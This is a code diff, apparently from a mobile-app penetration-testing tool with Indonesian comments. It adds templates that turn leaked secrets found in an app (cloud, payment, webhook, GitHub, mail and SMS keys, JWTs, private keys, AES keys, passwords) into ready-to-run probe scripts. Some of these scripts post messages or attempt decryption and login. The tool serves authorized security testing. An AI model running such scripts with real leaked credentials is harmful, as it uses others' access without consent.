@@ -301,6 +301,435 @@ subprocess.run(["adb", "shell", "am", "start", "-a", "android.intent.action.VIEW
         }
 
     # ------------------------------------------------------------------
+    # TIER 1: SECRET PoC — script siap jalan per temuan Secrets & Keys
+    # Deterministic template (bukan AI): per tipe kredensial, satu PoC siap
+    # eksekusi dengan mode PASIF (read-only) / AKTIF (menulis/mengirim) /
+    # TEMPLATE (butuh identifikasi endpoint dari corpus).
+    # ------------------------------------------------------------------
+
+    # (rule_id / pola match, poc_type, mode)
+    _SECRET_POC_CAP = 30
+
+    @staticmethod
+    def _secret_kind(rule_id: str, match: str) -> str:
+        """Klasifikasi tipe kredensial -> kunci dispatcher PoC."""
+        rid = (rule_id or "").lower()
+        m = (match or "").strip()
+        if ".firebaseio.com" in m or "firebaseio.com" in m:
+            return "firebase_url"
+        if rid in ("aws_key",) or m.startswith("AKIA"):
+            return "aws"
+        if m.startswith("sk_live") or m.startswith("sk_test") or m.startswith("rk_live") or m.startswith("rk_test"):
+            return "stripe"
+        if "hooks.slack.com/services/" in m:
+            return "slack_webhook"
+        if "discord.com/api/webhooks/" in m or "discordapp.com/api/webhooks/" in m:
+            return "discord_webhook"
+        if m.startswith("ghp_") or m.startswith("gho_") or m.startswith("ghu_") or m.startswith("ghs_") or m.startswith("ghr_"):
+            return "github_token"
+        if m.startswith("SG."):
+            return "sendgrid"
+        if m.startswith("SK") and len(m) == 34:
+            return "twilio"
+        if m.startswith("eyJ"):
+            return "jwt"
+        if "-----BEGIN" in m and "PRIVATE KEY-----" in m:
+            return "private_key"
+        if m.startswith("AIzaSy") or "gcp_api_key" in rid or "firebase_api_key" in rid:
+            return "google_api_key"
+        if "googleusercontent.com" in m or "oauth_client" in rid:
+            return "oauth_client_id"
+        if rid in ("aes_key_hex_32", "aes_iv_hex", "hardcoded_crypto_key", "salt_hardcoded"):
+            return "crypto_material"
+        if rid in ("login_credential_pair", "hardcoded_password", "hardcoded_secret",
+                   "hardcoded_api_key_var", "base64_creds_like", "hardcoded_password"):
+            return "generic_credential"
+        return ""
+
+    def generate_secret_poc(self, secret: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+        """Rakit satu PoC siap jalan untuk satu temuan secret. None jika tipe tidak dikenal."""
+        match = str(secret.get("match") or "").strip()
+        rule_id = str(secret.get("rule_id") or "")
+        kind = self._secret_kind(rule_id, match)
+        if not kind or not match:
+            return None
+
+        builder = getattr(self, "_secret_poc_" + kind, None)
+        if not builder:
+            return None
+        poc = builder(match, secret)
+        if not poc:
+            return None
+        poc.update({
+            "poc_type": kind,
+            "rule_id": rule_id,
+            "severity": str(secret.get("severity") or "-"),
+            "file_path": str(secret.get("file_path") or "-"),
+            "line_number": secret.get("line_number"),
+            "match": match[:200],
+        })
+        return poc
+
+    def generate_secret_pocs(self, secrets: List[Dict[str, Any]],
+                             cap: int = None) -> List[Dict[str, Any]]:
+        """Generate PoC untuk semua temuan (dedupe per nilai, cap total)."""
+        cap = cap or self._SECRET_POC_CAP
+        out, seen = [], set()
+        for sec in secrets or []:
+            if len(out) >= cap:
+                break
+            sev = str((sec or {}).get("severity") or "").lower()
+            if sev not in ("critical", "high", "medium"):
+                continue
+            key = (str(sec.get("rule_id") or ""), str(sec.get("match") or "")[:200])
+            if key in seen:
+                continue
+            seen.add(key)
+            poc = self.generate_secret_poc(dict(sec))
+            if poc:
+                out.append(poc)
+        return out
+
+    # ---- template per tipe (deterministic, placeholder __KEY__/__URL__) ----
+
+    def _secret_poc_google_api_key(self, match, secret):
+        code = """#!/usr/bin/env python3
+# PoC: Google API Key scope check (PASIF — GET read-only, tidak menulis/membuat resource)
+# Key: __KEY__
+# Jalankan: python3 poc_google_key.py
+import json, urllib.request, urllib.parse
+
+KEY = "__KEY__"
+
+PROBES = [
+    ("Generative Language (Gemini)", "https://generativelanguage.googleapis.com/v1beta/models?key="),
+    ("Maps Geocoding", "https://maps.googleapis.com/maps/api/geocode/json?address=jakarta&key="),
+    ("Drive About", "https://www.googleapis.com/drive/v3/about?fields=user&key="),
+    ("YouTube Data v3", "https://www.googleapis.com/youtube/v3/search?part=snippet&q=test&maxResults=1&key="),
+    ("Firebase Identity Toolkit", "https://identitytoolkit.googleapis.com/v1/projects?key="),
+]
+
+for name, base in PROBES:
+    url = base + urllib.parse.quote(KEY, safe="")
+    try:
+        req = urllib.request.Request(url)
+        with urllib.request.urlopen(req, timeout=10) as r:
+            body = r.read(400).decode("utf-8", "replace")
+            print(f"[!] {name}: HTTP {r.status} (KEY AKTIF di scope ini!) -> {body[:200]}")
+    except urllib.error.HTTPError as e:
+        detail = e.read(200).decode("utf-8", "replace") if e.fp else ""
+        print(f"[-] {name}: HTTP {e.code} {detail[:150]}")
+    except Exception as e:
+        print(f"[-] {name}: {e}")
+
+print("\nInterpretasi: 200 = key valid utk scope tsb; 403 'not activated/restricted' = aman/limited;")
+print("400/403 'API key not valid' = key sudah mati/rotasi.")
+"""
+        return {
+            "title": "Google API Key — Scope Probe",
+            "language": "python",
+            "mode": "PASIF",
+            "description": "Probe 5 scope Google (Gemini, Maps, Drive, YouTube, Identity Toolkit) secara read-only. Bandingkan hasil dengan Live Verifier.",
+            "code": code.replace("__KEY__", match),
+        }
+
+    def _secret_poc_firebase_url(self, match, secret):
+        url = match if match.startswith("http") else "https://" + match
+        code = f"""# PoC: Firebase Realtime DB open-rules check (PASIF: read .json; AKTIF: write test jangan lakukan tanpa izin)
+# URL: {url}
+# 1) READ TEST (aman):
+curl -s "{url.rstrip('/')}/.json" -o firebase_read.json -w "HTTP %{{http_code}}\n"
+head -c 300 firebase_read.json; echo
+
+# 2) Jika read 200 (rules terbuka), catat isi -> itu temuan P1/P2.
+# 3) WRITE TEST (AKTIF - hanya dgn izin tertulis!):
+# curl -s -X PUT "{url.rstrip('/')}/.json" -d '{{"poc":"readwrite-probe"}}'
+"""
+        return {
+            "title": "Firebase Realtime DB — Open Rules Check",
+            "language": "bash",
+            "mode": "PASIF",
+            "description": "Cek rules Firebase Realtime DB. Read test aman; write test HANYA dengan izin scope.",
+            "code": code,
+        }
+
+    def _secret_poc_aws(self, match, secret):
+        code = f"""# PoC: AWS Access Key validation (PASIF: STS GetCallerIdentity - read-only)
+# Access Key ID: {match}
+# Catatan: butuh Secret Access Key (cari di corpus: string 40-char base64-like
+# dekat temuan ini). Jika hanya Access Key ID tanpa secret, key tidak bisa dipakai sendiri.
+
+export AWS_ACCESS_KEY_ID="{match}"
+export AWS_SECRET_ACCESS_KEY="<ISI_SECRET_ACCESS_KEY_DARI_CORPUS>"
+export AWS_DEFAULT_REGION="us-east-1"
+
+aws sts get-caller-identity
+# 200 -> akun + role aktif (temuan KRITIS). 403 -> invalid/expired/locked down.
+"""
+        return {
+            "title": "AWS Access Key — STS GetCallerIdentity",
+            "language": "bash",
+            "mode": "PASIF",
+            "description": "Validasi key via STS (read-only). Butuh secret access key — cari di corpus dekat temuan.",
+            "code": code,
+        }
+
+    def _secret_poc_stripe(self, match, secret):
+        code = f"""# PoC: Stripe API key check (PASIF: GET /v1/balance - read-only)
+curl -s -u "{match}:" https://api.stripe.com/v1/balance -w "\nHTTP %{{http_code}}\n"
+# 200 = LIVE KEY AKTIF (kritis - bisa baca balance/transaksi)
+# 401 = key invalid/revoked
+"""
+        return {
+            "title": "Stripe API Key — Balance Probe",
+            "language": "bash",
+            "mode": "PASIF",
+            "description": "GET /v1/balance read-only. sk_live aktif = kritis; sk_test hanya flag hygiene.",
+            "code": code,
+        }
+
+    def _secret_poc_slack_webhook(self, match, secret):
+        code = f"""# PoC: Slack Webhook (AKTIF - mengirim 1 pesan ke channel)
+curl -s -X POST -H "Content-type: application/json" \
+  --data '{{"text":"[PoC] webhook dari MOPETOT - authorized test"}}' \
+  "{match}" -w "\nHTTP %{{http_code}}\n"
+# 200 = webhook aktif (bisa posting ke channel klien). Hapus pesan setelah testing.
+"""
+        return {
+            "title": "Slack Webhook — Send Probe",
+            "language": "bash",
+            "mode": "AKTIF",
+            "description": "Webhook aktif = siapa pun bisa posting ke channel. AKTIF: mengirim 1 pesan — hanya dengan izin.",
+            "code": code,
+        }
+
+    def _secret_poc_discord_webhook(self, match, secret):
+        code = f"""# PoC: Discord Webhook (PASIF: GET info webhook; AKTIF: kirim pesan)
+# 1) PASIF - info webhook:
+curl -s "{match}" -w "\nHTTP %{{http_code}}\n"
+
+# 2) AKTIF - kirim 1 pesan (hanya dengan izin):
+curl -s -X POST -H "Content-type: application/json" \
+  --data '{{"content":"[PoC] webhook dari MOPETOT - authorized test"}}' \
+  "{match}" -w "\nHTTP %{{http_code}}\n"
+"""
+        return {
+            "title": "Discord Webhook — Info & Send Probe",
+            "language": "bash",
+            "mode": "PASIF",
+            "description": "GET webhook info dulu (aman), lalu opsional kirim pesan (AKTIF, perlu izin).",
+            "code": code,
+        }
+
+    def _secret_poc_github_token(self, match, secret):
+        code = f"""# PoC: GitHub Token check (PASIF: GET /user - read-only)
+curl -s -H "Authorization: Bearer {match}" https://api.github.com/user -w "\nHTTP %{{http_code}}\n"
+# 200 = token aktif - perhatikan "plan", "scope" (repo? org? admin:org = kritis)
+# Scope repo + org = akses source code private klien (blast radius besar)
+"""
+        return {
+            "title": "GitHub Token — User Probe",
+            "language": "bash",
+            "mode": "PASIF",
+            "description": "Validasi token + identifikasi scope (repo/org = akses code private).",
+            "code": code,
+        }
+
+    def _secret_poc_sendgrid(self, match, secret):
+        code = f"""# PoC: SendGrid API key check (PASIF: GET /v3/scopes - read-only)
+curl -s -H "Authorization: Bearer {match}" https://api.sendgrid.com/v3/scopes -w "\nHTTP %{{http_code}}\n"
+# 200 = key aktif. Scope mail.send = bisa kirim email atas nama domain klien (spoofing).
+"""
+        return {
+            "title": "SendGrid Key — Scope Probe",
+            "language": "bash",
+            "mode": "PASIF",
+            "description": "Enumerate scope key read-only. mail.send = spoofing atas nama domain klien.",
+            "code": code,
+        }
+
+    def _secret_poc_twilio(self, match, secret):
+        code = f"""# PoC: Twilio API Key check (PASIF: GET Accounts - read-only, basic auth)
+# Twilio API Key format SK.., butuh API Secret (cari di corpus). Alternative:
+# jika temuan berbentuk AC.. (Account SID) + auth token, pakai itu:
+curl -s -u "ACCOUNT_SID:AUTHTOKEN" https://api.twilio.com/2010-04-01/Accounts.json -w "\nHTTP %{{http_code}}\n"
+# Key: {match}
+"""
+        return {
+            "title": "Twilio Key — Account Probe",
+            "language": "bash",
+            "mode": "PASIF",
+            "description": "Validasi kredensial Twilio read-only. SMS send capability = spoofing OTP.",
+            "code": code,
+        }
+
+    def _secret_poc_jwt(self, match, secret):
+        code = """#!/usr/bin/env python3
+# PoC: JWT decode & analysis (PASIF - decode lokal, tanpa network)
+# Token: __TOKEN__
+import base64, json, time
+
+TOKEN = "__TOKEN__"
+
+def b64pad(s):
+    return s + "=" * (-len(s) % 4)
+
+try:
+    h, p, *rest = TOKEN.split(".")
+    header = json.loads(base64.urlsafe_b64decode(b64pad(h)))
+    payload = json.loads(base64.urlsafe_b64decode(b64pad(p)))
+    print("[*] Header :", json.dumps(header))
+    print("[*] Payload:", json.dumps(payload))
+    alg = header.get("alg", "?")
+    print(f"[*] Alg: {alg}" + ("  <- 'none' = acceptalg tidak aman!" if alg == "none" else ""))
+    exp = payload.get("exp")
+    if exp:
+        status = "EXPIRED" if exp < time.time() else "MASIH BERLAKU"
+        print(f"[*] exp: {exp} ({time.strftime('%Y-%m-%d %H:%M', time.localtime(exp))}) -> {status}")
+    if not payload.get("exp"):
+        print("[!] Tanpa 'exp' - token tidak expire (kritis bila signature lemah)")
+    if payload.get("sub") or payload.get("user_id"):
+        print(f"[*] Subject: {payload.get('sub') or payload.get('user_id')}")
+    print(f"[*] Signature part: {rest[0][:40] if rest else 'TIDAK ADA (alg=none?)'}")
+except Exception as e:
+    print("[-] Decode gagal:", e)
+"""
+        return {
+            "title": "JWT — Decode & Analysis",
+            "language": "python",
+            "mode": "PASIF",
+            "description": "Decode header/payload lokal: alg, expiry, subject, keberadaan signature.",
+            "code": code.replace("__TOKEN__", match),
+        }
+
+    def _secret_poc_private_key(self, match, secret):
+        code = f"""# PoC: Private Key analysis (PASIF - analisis lokal)
+# Simpan ke file (perhatikan trailing newline):
+cat > poc_key.pem << 'PEMEOF'
+{match}
+PEMEOF
+
+# 1) Validitas key:
+openssl pkey -in poc_key.pem -check -noout && echo "[!] KEY VALID"
+
+# 2) Tipe & modulus:
+openssl pkey -in poc_key.pem -noout -text | head -5
+
+# 3) Public key (untuk dicocokkan dgn cert di corpus/server):
+openssl pkey -in poc_key.pem -pubout -outform DER | sha256sum
+# Cocokkan hash publik dgn certificate yang dipakai app/server -> pembuktian pemakaian.
+
+# HAPUS file setelah testing: rm poc_key.pem
+"""
+        return {
+            "title": "Private Key — Validity & Match Analysis",
+            "language": "bash",
+            "mode": "PASIF",
+            "description": "Validasi key openssl (lokal), ekstrak fingerprint public key untuk dicocokkan dengan cert di corpus.",
+            "code": code,
+        }
+
+    def _secret_poc_oauth_client_id(self, match, secret):
+        code = f"""# PoC: OAuth Client ID (informasional - client ID public-by-design)
+# Client ID: {match}
+# Client ID saja bukan vulnerability — kombinasi yang berbahaya:
+#   1) cek .well-known/openid-configuration provider untuk redirect_uri policy
+#   2) jika ada client_secret terpisah di corpus -> itu temuan utama
+#   3) cek apakah app pakai PKCE; tanpa PKCE + redirect lemah = OAuth hijack
+curl -s "https://accounts.google.com/.well-known/openid-configuration" | head -c 300
+"""
+        return {
+            "title": "OAuth Client ID — Context Check",
+            "language": "bash",
+            "mode": "PASIF",
+            "description": "Client ID public-by-design — PoC untuk memeriksa kombinasi (secret, PKCE, redirect policy).",
+            "code": code,
+        }
+
+    def _secret_poc_crypto_material(self, match, secret):
+        code = """#!/usr/bin/env python3
+# PoC: Crypto material analysis (PASIF - analisis lokal)
+# Nilai: __VALUE__
+# Rule: __RULE__
+import binascii, math, collections
+
+VALUE = "__VALUE__"
+hexval = VALUE.replace("0x", "").replace(" ", "")
+
+print("[*] Nilai  :", VALUE)
+print("[*] Panjang :", len(hexval), "hex chars =", len(hexval) * 4, "bit")
+
+try:
+    raw = binascii.unhexlify(hexval if len(hexval) % 2 == 0 else hexval[:-1])
+    print("[*] Bytes  :", len(raw))
+    # entropy shannon
+    counts = collections.Counter(raw)
+    ent = -sum((c / len(raw)) * math.log2(c / len(raw)) for c in counts.values())
+    print(f"[*] Entropy: {ent:.2f} bit/byte (8.0 = random sempurna; <4 = kemungkinan bukan key asli)")
+
+    # Jika ini AES key + ada ciphertext (dari traffic/corpus), decrypt attempt:
+    # pip install pycryptodome
+    try:
+        from Crypto.Cipher import AES
+        ciphertext = binascii.unhexlify("<ISI_CIPHERTEXT_HEX>")  # dari intercept/pcap
+        for mode, mk in (("ECB", lambda: AES.new(raw, AES.MODE_ECB)),
+                         ("CBC-IV0", lambda: AES.new(raw, AES.MODE_CBC, iv=b"\x00" * 16)),
+                         ("CTR-IV0", lambda: AES.new(raw, AES.MODE_CTR, nonce=b"\x00" * 8))):
+            try:
+                pt = mk().decrypt(ciphertext[:64])
+                printable = sum(32 <= b < 127 for b in pt) / max(1, len(pt))
+                print(f"[*] {mode}: printable={printable:.0%} -> {pt[:48]!r}")
+            except Exception:
+                pass
+    except ImportError:
+        print("[*] pycryptodome tidak ada - skip decrypt attempt")
+except Exception as e:
+    print("[-] Bukan hex valid:", e)
+"""
+        return {
+            "title": "Crypto Material — Entropy & Decrypt Attempt",
+            "language": "python",
+            "mode": "PASIF",
+            "description": "Analisis lokal: entropy (key asli vs dummy), lalu attempt decrypt AES (ECB/CBC/CTR) jika ada ciphertext.",
+            "code": code.replace("__VALUE__", match).replace("__RULE__", str(secret.get("rule_id") or "-")),
+        }
+
+    def _secret_poc_generic_credential(self, match, secret):
+        code = """#!/usr/bin/env python3
+# PoC TEMPLATE: kredensial generik (butuh identifikasi endpoint dari corpus)
+# Rule      : __RULE__
+# Nilai     : __VALUE__
+# Catatan   : isi TARGET/METHOD/BODY dari hasil explorasi corpus
+#            (Code Explorer: grep nama variable/username di sources_java)
+import urllib.request, urllib.error, base64
+
+CRED = "__VALUE__"
+# Opsi A - Bearer header (API key/mobile API umumnya begini):
+# TARGET = "https://<endpoint-dari-corpus>/api/v1/profile"
+# req = urllib.request.Request(TARGET, headers={"Authorization": "Bearer " + CRED})
+
+# Opsi B - Basic auth (login_credential_pair / password):
+user, pwd = "<USERNAME>", CRED
+basic = base64.b64encode(f"{user}:{pwd}".encode()).decode()
+req = urllib.request.Request("https://<ENDPOINT_LOGIN>/login",
+                             headers={"Authorization": "Basic " + basic})
+try:
+    with urllib.request.urlopen(req, timeout=10) as r:
+        print("[!] HTTP", r.status, r.read(300))
+except urllib.error.HTTPError as e:
+    print("[-] HTTP", e.code, e.read(200)[:200])
+except Exception as e:
+    print("[-]", e)
+"""
+        return {
+            "title": "Generic Credential — Request Scaffold",
+            "language": "python",
+            "mode": "TEMPLATE",
+            "description": "Scaffold login/API test. Identifikasi endpoint via Code Explorer (grep nama variable di corpus), isi TARGET, lalu eksekusi. Lanjut reasoning pakai chat agent jika bingung.",
+            "code": code.replace("__VALUE__", match).replace("__RULE__", str(secret.get("rule_id") or "-")),
+        }
+
+    # ------------------------------------------------------------------
     # RASP-AWARE FRIDA BYPASS GENERATOR
     # Baca hasil deteksi RASP (meta["rasp"] dari findings.json) lalu rakit
     # script sesuai musuh: anti-frida-detection native, hook per-RASP SDK,
